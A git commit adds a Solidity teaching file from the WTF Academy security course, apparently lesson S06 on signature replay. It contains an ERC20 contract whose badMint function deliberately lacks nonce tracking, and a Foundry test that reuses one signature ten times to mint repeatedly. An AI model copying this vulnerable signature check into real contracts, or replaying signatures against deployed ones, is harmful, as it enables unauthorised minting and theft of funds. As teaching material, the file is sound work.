fe9d5f95e6bd923084f344ed71645bcaf830ea02
xfu <angerpeanut@gmail.com>
2023-09-14 20:39:42 +0800

    Create S06SignatureReplay.sol
    WTF S06SignatureReplay

---
+++ src/wtf/S06SignatureReplay.sol
@@ -0,0 +1,102 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import "forge-std/Test.sol";
+
+/**
+    WTF Solidity 合约安全: S06. 签名重放
+
+    ref https://www.wtf.academy/solidity-104/SignatureReplay/
+
+    command `forge test -vvv --contracts ./src/wtf/S06SignatureReplay.sol`
+ */
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+
+// 权限管理错误例子
+contract SigReplay is ERC20 {
+    address public signer;
+
+    // 构造函数：初始化代币名称和代号
+    constructor() ERC20("SigReplay", "Replay") {
+        signer = msg.sender;
+    }
+
+    /**
+     * 有签名重放漏洞的铸造函数
+     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
+     * amount: 1000
+     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b
+     */
+    function badMint(address to, uint amount, bytes memory signature) public {
+        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
+        require(verify(_msgHash, signature), "Invalid Signer!");
+        _mint(to, amount);
+    }
+
+    /**
+     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash
+     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
+     * amount: 1000
+     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be
+     */
+    function getMessageHash(
+        address to,
+        uint256 amount
+    ) public pure returns (bytes32) {
+        return keccak256(abi.encodePacked(to, amount));
+    }
+
+    /**
+     * @dev 获得以太坊签名消息
+     * `hash`：消息哈希
+     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]
+     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`
+     * 添加"\x19Ethereum Signed Message:\n32"字段，防止签名的是可执行交易。
+     */
+    function toEthSignedMessageHash(
+        bytes32 hash
+    ) public pure returns (bytes32) {
+        // 32 is the length in bytes of hash,
+        // enforced by the type signature above
+        return
+            keccak256(
+                abi.encodePacked("\x19Ethereum Signed Message:\n32", hash)
+            );
+    }
+
+    // ECDSA验证
+    function verify(
+        bytes32 _msgHash,
+        bytes memory _signature
+    ) public view returns (bool) {
+        return ECDSA.recover(_msgHash, _signature) == signer;
+    }
+}
+
+contract ContractTest is Test {
+    function testSignatureReplay() public {
+        uint256 alicePrivateKey = 0x1;
+        address aliceAddr = vm.addr(alicePrivateKey);
+
+        vm.startPrank(aliceAddr);
+        SigReplay sigReplay = new SigReplay();
+
+        bytes32 digest = sigReplay.toEthSignedMessageHash(
+            sigReplay.getMessageHash(aliceAddr, 1000)
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePrivateKey, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        for (uint i; i < 10; ) {
+            sigReplay.badMint(aliceAddr, 1000, signature);
+            unchecked {
+                ++i;
+            }
+            emit log_named_uint("count of signature used successfully", i);
+        }
+    }
+}
